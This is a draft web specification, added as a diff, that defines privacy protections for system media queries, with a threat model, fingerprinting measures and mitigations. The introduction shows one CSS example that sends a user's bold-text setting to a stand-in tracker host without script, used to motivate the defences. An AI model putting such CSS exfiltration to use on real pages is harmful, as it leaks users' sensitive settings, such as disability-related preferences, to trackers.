@@ -1,0 +1,533 @@
+<pre class=metadata>
+Title: Privacy Protections for Media Features
+Shortname: media-feature-privacy
+Level: none
+Status: LD
+ED: https://arronei.github.io/CSS-Additions/system-media-queries/privacy-protections/spec/
+Repository: arronei/CSS-Additions
+Editor: Arron Eicholz
+Abstract: Media features that describe the user's system, such as whether power saving is on or which
+    accessibility settings are turned on, can be read by style sheets as well as by script, and a style
+    sheet can report what it reads to a server without running any script. This specification defines
+    the protections that the system media query specifications apply to such features:
+    [=protected evaluation=], which lets a page change its appearance without learning the value;
+    [=delayed change delivery=], which stops a change from linking the user's visits to different sites;
+    [=frame-scoped exposure=], which limits what embedded third-party content learns; and
+    [=reduced-exposure contexts=], in which features report fixed values. It also defines the threat
+    model and the way of measuring fingerprinting that those specifications share.
+Markup Shorthands: markdown yes, css yes
+Complain About: accidental-2119 no, missing-example-ids yes
+Assume Explicit For: yes
+</pre>
+
+<pre class=link-defaults>
+spec:css-conditional-3; type:at-rule; text:@media
+spec:mediaqueries-5; type:dfn; text:media feature
+spec:mediaqueries-5; type:dfn; text:media query
+spec:html; type:dfn; for:Document; text:visibility state
+spec:dom; type:dfn; text:document
+spec:permissions-policy-1; type:dfn; text:policy-controlled feature
+spec:css-images-3; type:type; text:<gradient>
+spec:css-backgrounds-3; type:property; text:border-color
+spec:css-backgrounds-3; type:property; text:border-top-color
+spec:css-backgrounds-3; type:property; text:border-right-color
+spec:css-backgrounds-3; type:property; text:border-bottom-color
+spec:css-backgrounds-3; type:property; text:border-left-color
+spec:css-backgrounds-3; type:property; text:box-shadow
+spec:css-multicol-1; type:property; text:column-rule-color
+spec:fill-stroke-3; type:property; text:fill
+spec:fill-stroke-3; type:property; text:fill-opacity
+spec:fill-stroke-3; type:property; text:stroke
+spec:fill-stroke-3; type:property; text:stroke-opacity
+spec:fill-stroke-3; type:property; text:stroke-width
+spec:fill-stroke-3; type:property; text:stroke-dasharray
+spec:fill-stroke-3; type:property; text:stroke-dashoffset
+</pre>
+
+<pre class=biblio>
+{
+    "LEAKING-BATTERY": {
+        "title": "The leaking battery: A privacy analysis of the HTML5 Battery Status API",
+        "authors": ["Łukasz Olejnik", "Gunes Acar", "Claude Castelluccia", "Claudia Diaz"],
+        "href": "https://eprint.iacr.org/2015/616",
+        "date": "2015"
+    },
+    "CSS-VISITED": {
+        "title": "Privacy and the :visited selector",
+        "href": "https://developer.mozilla.org/en-US/docs/Web/CSS/Privacy_and_the_:visited_selector",
+        "publisher": "MDN"
+    }
+}
+</pre>
+
+
+<h2 id=intro>Introduction</h2>
+
+*This section is non-normative.*
+
+Media queries were designed to describe the output device: the size of the viewport, the color depth of
+the screen, whether there is a mouse. The system media query specifications add features that describe
+the user's situation instead: whether the device is saving power, whether the window is focused,
+whether the screen is being shared, whether the user has asked for bold text. That information helps
+pages adapt, and it is also the kind of information that trackers collect.
+
+Media features are unusual among web platform features, because a page doesn't need script to read them.
+A style sheet can send a feature's value to a server by loading a resource only when the query matches:
+
+<div class=example id=example-exfiltration>
+    <pre highlight=css>
+    @media (prefers-bold-text: bold) {
+      body { background-image: url("https://tracker.example/collect?bold-text=1"); }
+    }
+    </pre>
+
+    This works with script turned off, in HTML email clients that load remote images, and on any site where
+    an attacker can add CSS but not script. The request also tells the server when the page was loaded,
+    and a rule like it that matches only after a change tells the server when the value changed.
+</div>
+
+Turning the features off in those places, the usual answer, gives up what they are for. This
+specification gives the system media query specifications better tools:
+
+: [[#protected]]
+:: The page's appearance adapts to the user, but nothing the page can measure changes: not script, not
+    layout, not network requests. The only way for a page to learn the value is to ask the user.
+: [[#delayed-delivery]]
+:: When a value changes, documents learn of the change one at a time, when they are visible, after a
+    random delay, so a tracker on two sites can't match the two visits by when the value changed.
+: [[#frame-scoped]]
+:: Embedded documents from other origins see a restricted value unless the page embedding them allows
+    more.
+: [[#reduced-exposure]]
+:: Where the user agent is already protecting the user from fingerprinting, features report values that
+    don't depend on the user.
+
+Each system media query specification says which of these apply to each of its features, and why.
+
+
+<h2 id=threat-model>Threat model</h2>
+
+*This section is non-normative.*
+
+<h3 id=attackers>Attackers</h3>
+
+: First-party sites
+:: A site the user visits reads features in order to fingerprint the user, or to infer something about
+    them.
+: Third-party content
+:: A tracker whose documents are embedded in many sites, or whose script many sites include, tries to
+    recognize the same user on each of them. Partitioned storage stops it from using cookies to do this,
+    so it looks for values that are the same, or that change at the same moment, in each context.
+: Style-only attackers
+:: Someone who can add CSS but not script: the author of an HTML email, a page viewed with script
+    blocked, a user-provided theme, or an attacker exploiting a CSS injection vulnerability in a site
+    the user trusts.
+: Content that evades review
+:: A page that shows one thing to its target and something else to people and systems that check it,
+    such as family members, support staff, moderators, or security scanners.
+
+<h3 id=attacker-goals>Goals</h3>
+
+: Fingerprinting
+:: A value that stays the same for a long time adds to an identifier that doesn't need storage.
+: Correlation
+:: A value that changes at one instant in many contexts links those contexts to one user, even if the
+    value itself is common.
+: Inference
+:: A value reveals something sensitive about the user: a disability or health condition, their age, what
+    they are doing, where they are, or who else can see their screen.
+: Evasion
+:: A value lets a page look harmless to anyone checking it.
+
+<h3 id=channels>Channels</h3>
+
+A document can learn the result of a media query in these ways. A protection has to address all of them.
+
+<table class=data>
+    <thead><tr><th>Channel<th>Examples<th>Addressed by
+    <tbody>
+        <tr><td>Script
+            <td><code>matchMedia()</code>, <code>MediaQueryList</code> <code>change</code> events,
+                <code>getComputedStyle()</code>, the CSSOM
+            <td>[[#protected]], [[#frame-scoped]]
+        <tr><td>Layout
+            <td>Element sizes and positions read through CSSOM View, <code>ResizeObserver</code>,
+                <code>IntersectionObserver</code>, scroll positions
+            <td>[[#protected]]
+        <tr><td>Network
+            <td>A <code>url()</code> in a rule that applies only under one result; an
+                <code>@import</code> or <code>&lt;link></code> with a media query; <code>&lt;source
+                media></code>; a font loaded because a rule changed <code>font-weight</code>; a lazy-loaded
+                image that enters the viewport because layout changed
+            <td>[[#protected]]
+        <tr><td>Timing
+            <td>The moment a value changes, observed in two documents
+            <td>[[#delayed-delivery]]
+        <tr><td>Interaction
+            <td>The user clicks something that is visible only under one result
+            <td>Not addressed; see [[#residual-risks]]
+        <tr><td>Pixels
+            <td>An API that renders the document into pixels that script can read
+            <td>[[#protected]]
+</table>
+
+<h3 id=measuring>Measuring fingerprinting</h3>
+
+Fingerprinting is measured in bits of information. If a fraction |p| of users have a value, a site that
+sees the value learns −log<sub>2</sub>(|p|) bits about the user. Across all users, the average is the
+entropy: the sum over the values of −|p| log<sub>2</sub>(|p|). About 33 bits are enough to single out
+one person among 8 billion.
+
+The average hides who pays. For a setting that few people turn on, the average is small, but the people
+who have turned it on are much easier to identify:
+
+<table class=data id=entropy-table>
+    <thead><tr><th>Users with the setting on<th>Bits when on<th>Bits when off<th>Average
+    <tbody>
+        <tr><td>50%<td>1.00<td>1.00<td>1.00
+        <tr><td>10%<td>3.32<td>0.15<td>0.47
+        <tr><td>1%<td>6.64<td>0.01<td>0.08
+        <tr><td>0.1%<td>9.97<td>0.00<td>0.01
+</table>
+
+The system media query specifications therefore report the bits a feature reveals about the users who
+have the uncommon value, not the average. When a setting is used mostly by people with a disability, the
+users who are easiest to identify are the users with that disability.
+
+Features add up only when they are independent. Settings that tend to be turned on together, such as two
+accessibility settings, reveal less in combination than their sum, and a value that script or HTTP already
+reveals adds nothing on its own. It can still matter, because it reaches places that script and HTTP
+headers don't, such as a style sheet in an email.
+
+
+<h2 id=terms>Terms</h2>
+
+A <dfn export>system media feature</dfn> is a [=media feature=] whose value comes from the user's device,
+operating system, user agent settings, or surroundings, rather than from the document or the viewport.
+
+A system media feature's <dfn export>actual value</dfn> is the value that its specification describes,
+such as whether power saving is on.
+
+
+<h2 id=protected>Protected evaluation</h2>
+
+<h3 id=protected-definitions>Protected media features</h3>
+
+A specification can define a [=system media feature=] as a <dfn export>protected media feature</dfn>,
+and give it an <dfn export>observable value</dfn>: a value that doesn't depend on the user, usually the
+value that most users have.
+
+For each [=document=], the specification of a protected media feature says whether the document uses
+<dfn export>full evaluation</dfn> or <dfn export>protected evaluation</dfn> for it. In full evaluation, the
+feature is like any other media feature: every query uses its [=actual value=]. The rest of this section
+defines protected evaluation.
+
+A rule <dfn>depends on</dfn> a feature if the feature appears in the media query list of an
+''@media'' rule that contains it, of the style sheet that contains it, or of an <code>@import</code> rule
+or <code>&lt;link></code> element through which that style sheet was loaded, including through a custom
+media query that uses the feature.
+
+<h3 id=two-styles>Observable style and painted style</h3>
+
+In a document that uses protected evaluation for one or more protected media features:
+
+* The <dfn export>observable style</dfn> of an element is its style computed with each of those features
+    taking its [=observable value=].
+* The <dfn export>painted style</dfn> of an element is its style computed with each of those features
+    taking its [=actual value=].
+
+Every other media feature has the same value in both. When all of the features' actual values equal
+their observable values, the two styles are the same.
+
+When the user agent paints an element, it uses the painted style for the [=paint-only properties=], and
+the observable style for every other property. Everything else the user agent does with style uses the
+observable style. In particular:
+
+1. Media queries in the document that are evaluated outside style rules, such as the
+    <code>media</code> attributes of <code>&lt;source></code> and <code>&lt;meta name=theme-color></code>,
+    and <code>matchMedia()</code>, use the observable value. So do any other APIs that report whether a
+    media query matches.
+1. <code>getComputedStyle()</code>, the Typed OM, and all other APIs that return style values return the
+    observable style.
+1. Box generation, layout, scrolling, hit testing, focus, selection, and the accessibility tree use the
+    observable style.
+1. Resources are fetched only as the observable style requires. A style sheet whose media query list uses
+    a protected media feature, and a style sheet loaded by an <code>@import</code> rule whose media query
+    list uses one, is fetched whether or not the query matches.
+1. Transitions and animations are created, run, and reported only from the observable style. A
+    difference between the painted style and the observable style never starts a transition or an
+    animation, and when an [=actual value=] changes, the user agent paints the new painted style without
+    a transition.
+1. An API that renders document content into pixels that script can read, and any other API that
+    exposes the result of painting to the document, uses the observable style. This doesn't apply to
+    captures of the screen, window, or tab that the user starts through the user agent's own interface.
+1. Performance entries, <code>requestAnimationFrame()</code> callbacks, and other effects that the
+    document can observe must not differ because the painted style differs from the observable style.
+    User agents should also avoid timing differences, for example by painting both kinds of change the
+    same way.
+
+<div class=note>
+    This is the same approach that user agents take to <code>:visited</code> links [[CSS-VISITED]]: a
+    visited link can be painted in a different color, but script, layout, and the network see an
+    unvisited link. The list of paint-only properties here is longer, because none of the properties in
+    it affect layout.
+</div>
+
+<h3 id=paint-only>Paint-only properties</h3>
+
+The <dfn export>paint-only properties</dfn> are the properties below, including their logical
+equivalents. Shorthands such as 'border-color' and 'outline' set the paint-only longhands they expand to;
+their other longhands keep their observable values.
+
+* 'color'
+* 'background-color'
+* 'background-image', when every layer's value is ''background-image/none'' or a <<gradient>>.
+    If any layer is another image, the observable value is used.
+* 'border-top-color', 'border-right-color', 'border-bottom-color', 'border-left-color'
+* 'outline-color', 'outline-style', 'outline-width', 'outline-offset'
+* 'box-shadow', 'text-shadow'
+* 'text-decoration-line', 'text-decoration-style', 'text-decoration-color', 'text-decoration-thickness',
+    'text-underline-offset', 'text-underline-position'
+* '-webkit-text-stroke-color', '-webkit-text-stroke-width'
+* 'column-rule-color'
+* 'caret-color', 'caret-animation', 'caret-shape'
+* 'accent-color', 'scrollbar-color'
+* 'fill', 'fill-opacity', 'stroke', 'stroke-opacity', 'stroke-width', 'stroke-dasharray',
+    'stroke-dashoffset'. If a paint server is referenced by a <code>url()</code> that doesn't point to
+    an element in the same document, the observable value is used.
+
+None of these properties changes the size or position of any box, the scrollable overflow, what is hit
+by a pointer, what can be focused, or what the accessibility tree contains, and none of their allowed
+values fetches a resource.
+
+Custom properties and other properties still take part in the cascade of the painted style: a
+paint-only property can use ''var()'', ''currentcolor'', or ''em'' units, and gets the values that the
+painted style gives them.
+
+<div class=example id=example-masking>
+    A banking site hides the account balance while the screen is shared. An overlay that always exists,
+    and is always transparent in the observable style, is painted solid in a capture. Nothing about the
+    element's size, the accessibility tree, or clicks changes.
+
+    <pre highlight=css>
+    .balance { position: relative; }
+    .balance::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background-color: transparent;
+    }
+
+    @media (screen-capture: active) {
+      .balance::after { background-color: gray; }
+      /* Ignored during protected evaluation: display isn't a paint-only property. */
+      .balance { display: none; }
+    }
+    </pre>
+</div>
+
+<h3 id=protected-implementation>Implementation notes</h3>
+
+*This section is non-normative.*
+
+The user agent only needs the painted style for elements matched by rules that [=depend on=] a
+protected media feature, and only while that feature's actual value differs from its observable value.
+Most documents have no such rules, and most users have the observable value, so most documents never
+compute a second style.
+
+<h3 id=residual-risks>What protected evaluation doesn't prevent</h3>
+
+*This section is non-normative.*
+
+* **Interaction.** A page can show something only under one result, such as a link that says "click
+    here", and learn the result if the user reacts to it. This needs the user's help, reveals the result
+    only to pages that trick the user, and is the same weakness that <code>:visited</code> has.
+* **Captures the user shares with the page.** If the user lets a page capture its own tab, the page can
+    see what was painted. The user agent's capture prompt asks the user first.
+* **People.** Anyone who can see the user's screen can see the result.
+* **Timing.** A user agent that repaints more slowly for a painted-style change could leak the result
+    through paint timing. [[#two-styles]] asks user agents to avoid this, and the problem is the one
+    <code>:visited</code> implementations already solved.
+
+
+<h2 id=delayed-delivery>Delayed change delivery</h2>
+
+<h3 id=delivery-definitions>Delivered values</h3>
+
+A specification can say that a [=system media feature=] uses <dfn export>delayed change delivery</dfn>,
+and give a <dfn export>maximum delay</dfn> and a <dfn export>minimum interval</dfn>. This applies to
+documents that use the feature's actual value; a document that uses [=protected evaluation=] for the
+feature doesn't observe its value, so its painted style updates immediately.
+
+Each [=document=] has a <dfn>delivered value</dfn> for the feature, which is the value its media queries
+use. When the document is created, its [=delivered value=] is the [=actual value=].
+
+To <dfn>deliver a value</dfn> to a document, set its delivered value to the actual value, restyle the
+document, and fire <code>change</code> events at the affected <code>MediaQueryList</code> objects, as
+for any other media feature change.
+
+Whenever the actual value changes, and whenever a document's [=visibility state=] becomes
+"<code>visible</code>", including when it is restored from the back/forward cache, run these steps for
+each document whose delivered value differs from the actual value:
+
+1. If the document's visibility state is "<code>hidden</code>", stop. The document will be updated when
+    it becomes visible.
+1. If less than the minimum interval has passed since a value was last delivered to the document,
+    wait until it has, then start these steps again.
+1. If these steps were run because the document's visibility state became "<code>visible</code>",
+    [=deliver a value=] to it in the same task in which the <code>visibilitychange</code> event is fired,
+    and stop.
+1. If a delivery to the document is already pending, stop.
+1. Choose a delay uniformly at random between zero and the maximum delay, independently for this
+    document and this change.
+1. After the delay, if the document is still visible and its delivered value still differs from the
+    actual value, [=deliver a value=] to it.
+
+<h3 id=delivery-rationale>Why this works, and its limits</h3>
+
+*This section is non-normative.*
+
+When the same value changes in two documents at the same instant, a tracker present in both can match
+them, however common the value. The Battery Status API showed this in practice: the battery level and
+the time it took to change were enough to link a user's visits to different sites [[LEAKING-BATTERY]].
+
+A hidden document learns of a change only when it becomes visible. The moment a document becomes visible
+is already revealed by the <code>visibilitychange</code> event, and when the user switches tabs, the
+document being hidden and the document being shown already fire their events together. A document that
+learns of a change this way therefore learns nothing about when the change happened.
+
+A document that is visible when the change happens learns of it after a random delay. On a phone, only
+one document is usually visible, so the delay rarely matters. On a desktop, several windows can be visible
+at once, and the delay means that two of them learn of the same change up to the maximum delay apart.
+
+The delay weakens the link from a single change; it doesn't remove it. Suppose a tracker sees a million
+users, and each has one change a day at a random time. With a maximum delay of 60 seconds, about 0.14% of
+the other users also have a change within 60 seconds of any given change, so one matching change narrows
+a million candidates to about 1,400, two narrow them to about 2, and three identify the user. The minimum
+interval limits how many changes a tracker can see. The rest of the protection comes from how rarely two
+documents are visible when the value changes, which is why specifications use this mechanism for values
+that change rarely, and use [[#frame-scoped]] as well when embedded content doesn't need the
+value.
+
+
+<h2 id=frame-scoped>Frame-scoped exposure</h2>
+
+A specification can say that a [=system media feature=] uses <dfn export>frame-scoped exposure</dfn>. It
+names a [=policy-controlled feature=] whose [=policy-controlled feature/default allowlist=] is <code>&#39;self&#39;</code>, and says what
+the feature does in a document that isn't allowed to use that policy-controlled feature: either it takes a
+<dfn export>restricted value</dfn> that the specification defines, or the document uses
+[=protected evaluation=] for it.
+
+With the default allowlist, top-level documents and same-origin frames use the feature normally. A
+cross-origin frame does so only if the page embedding it allows it:
+
+<div class=example id=example-allow>
+    <pre highlight=html>
+    &lt;iframe src="https://widgets.example/chat" allow="window-focus-state">&lt;/iframe>
+    </pre>
+</div>
+
+A site can also turn the feature off for itself and all of its frames with a
+<code>Permissions-Policy</code> header.
+
+<div class=note>
+    Trackers that link visits across sites are embedded in those sites. Cross-origin frames that don't
+    need a value, which is most of them, don't get it, and the site that embeds a frame decides.
+</div>
+
+
+<h2 id=reduced-exposure>Reduced-exposure contexts</h2>
+
+A [=document=] is in a <dfn export>reduced-exposure context</dfn> when any of these is true:
+
+* The user agent protects the document against fingerprinting in other ways, such as in a private
+    browsing mode that also reports a standard screen size, limits the fonts it reveals, or gives
+    rounded timer values.
+* The user agent hides the user's IP address from the document's origin, such as through a proxy or
+    relay it runs. Without the IP address, a value that changes when the user's network changes is more
+    useful for linking visits.
+* Scripting is disabled for the document because of a user or user agent choice made for privacy or
+    safety, such as a message shown in an email client.
+* The user has turned off exposure of the feature, as described in [[#user-control]].
+
+The user agent decides which of its modes count. Each system media query specification says what its
+features do in a reduced-exposure context: take a fixed value, or use protected evaluation.
+
+<h3 id=user-control>User control</h3>
+
+When a specification says a system media feature is <dfn export>under user control</dfn>, the user agent
+must give the user a way to stop exposing it. When the user does, every document is in a reduced-exposure context for that
+feature. The user agent may offer this for each site as well as for all sites.
+
+
+<h2 id=choosing>Choosing protections</h2>
+
+*This section is non-normative.*
+
+Specifications that define system media features should use this table to choose protections, and should
+explain their choice in their privacy considerations.
+
+<table class=data>
+    <thead><tr><th>If the feature…<th>then use
+    <tbody>
+        <tr><td>reveals something sensitive, or could help a page evade review, and its uses are visual
+            <td>[[#protected]]
+        <tr><td>changes while documents are open, and doesn't need to take effect the instant it changes
+            <td>[[#delayed-delivery]]
+        <tr><td>must take effect the instant it changes, and script in the same documents already sees
+            that instant
+            <td>no delay, and name the API that already exposes it
+        <tr><td>isn't needed by most embedded third-party content
+            <td>[[#frame-scoped]]
+        <tr><td>is already available to script, and to servers through HTTP
+            <td>a requirement that the value match what script sees, so nothing new is revealed
+</table>
+
+<table class=data>
+    <thead><tr><th>Specification<th>Protected evaluation<th>Delayed delivery<th>Frame-scoped<th>User control
+    <tbody>
+        <tr><td>Reduced Power Preference<td><td>Yes<td><td>Yes
+        <tr><td>Network Media Queries<td><td>''connection'' only<td><td>Yes
+        <tr><td>Window Focus<td><td><td>Yes<td>
+        <tr><td>Screen Capture<td>Always<td><td><td>Yes
+        <tr><td>Keyboard Media Queries<td><td>''keyboard'' only<td>Yes<td>Yes
+        <tr><td>Accessibility Preferences<td>When not shared<td>Yes<td>Yes<td>Yes
+        <tr><td>Regional Preferences<td><td><td><td>Through <code>Intl</code>
+</table>
+
+
+<h2 id=privacy>Privacy considerations</h2>
+
+The mechanisms in this specification reduce what a document can learn; they don't make every feature
+safe to add. A specification that uses them still needs to show that its features are worth what they
+reveal after the protections apply, and to describe what they still reveal.
+
+[=Protected evaluation=] hides a value from the document, not from the user or from people who can see the
+screen. [=Delayed change delivery=] raises the cost of linking visits by timing, and gets weaker as a
+tracker observes more changes. [=Frame-scoped exposure=] does nothing against a tracker that sites include
+as first-party script.
+
+
+<h2 id=security>Security considerations</h2>
+
+* [=Protected evaluation=] doesn't change hit testing, so a pointer hits an element where its observable
+    box is, even if the painted style has made it transparent. This lets a page hide a button from the
+    user while it can still be clicked, which a page can already do with any style.
+* Computing a second style costs time. A page can't make the user agent do that work unless the user has
+    a value different from the observable value, and user agents can limit the number of elements they
+    compute it for.
+
+
+<h2 id=open-issues>Open issues</h2>
+
+<p class=issue>Should 'opacity' and 'filter' be paint-only properties? They are the most natural way to
+hide or blur content, but they create stacking contexts, and 'filter' creates a containing block, so the
+painted style would need a different paint order from the one used for hit testing.
+
+<p class=issue>Are the maximum delays and minimum intervals chosen by the system media query
+specifications right? Longer delays protect better and adapt more slowly.
+
+<p class=issue>Should a document be able to find out whether it uses protected evaluation for a feature,
+so that its author can choose a design that works with paint-only properties? Knowing that reveals
+whether the user has turned off sharing, which is less than the value but not nothing.
